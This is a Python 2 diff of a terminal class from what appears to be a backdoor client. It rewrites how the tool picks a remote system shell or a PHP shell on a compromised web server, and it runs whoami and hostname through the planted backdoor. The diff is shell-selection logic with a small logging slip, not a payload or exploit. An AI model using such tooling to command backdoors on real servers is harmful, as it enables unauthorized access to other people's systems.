@@ -21,7 +21,7 @@ class Terminal():
         self.one_shot = one_shot
         self.completions = {}
                 
-        self.__get_best_interpreter_available()
+        self.__load_interpreters()
         
         if not one_shot:
             
@@ -37,34 +37,32 @@ class Terminal():
             atexit.register( readline.write_history_file, self.history )
 
 
-    def __get_best_interpreter_available(self):
+    def __load_interpreters(self):
         
-        for shell_name in self.modhandler.module_info:
-            if shell_name.startswith('shell.'):
-        
-                try:
-                    self.modhandler.load(shell_name)
-                except ModuleException, e:
-                    print '[!] [%s] Error loading module: %s' % (shell_name, e)
-                else:
-                    self.interpreter = shell_name
-                    break
-
-        if self.interpreter == 'shell.sh':
+        try:
+            self.modhandler.load('shell.sh')
+        except ModuleException, e:
+            print '[!] [shell.sh] Error loading module: %s' % (e)
             
+            try:
+                self.modhandler.load('shell.php')
+            except ModuleException, e:
+                print '[!] [shell.sh] Error loading module: %s' % (e)
+                print '[!] No backdoor found. Check url and password'
+                
+            else:
+                print '[+] Fallback to PHP interpreter \'%s\'.' % self.interpreter
+                self.prompt        = "[shell.php]$ "
+                self.interpreter = 'shell.php'
+            
+        else:
+            self.interpreter = 'shell.sh'
             self.username      = self.modhandler.load('system.info').run("whoami")
             self.hostname      = self.modhandler.load('system.info').run("hostname")
             self.cwd           = self.modhandler.load('system.info').run("basedir")
             self.cwd_extract = re.compile( "cd\s+(.+)", re.DOTALL )
             self.prompt = "[shell.sh] %s@%s:%s$ "
             print '[+] Using system shell interpreter \'%s\'' % self.interpreter
-            
-        elif self.interpreter == 'shell.php':
-            print '[+] Fallback to PHP interpreter \'%s\'.' % self.interpreter
-            self.prompt        = "[shell.php]$ "
-            
-        else:
-            print '[!] No backdoor found. Check url and password'
             
 
     def loop(self):
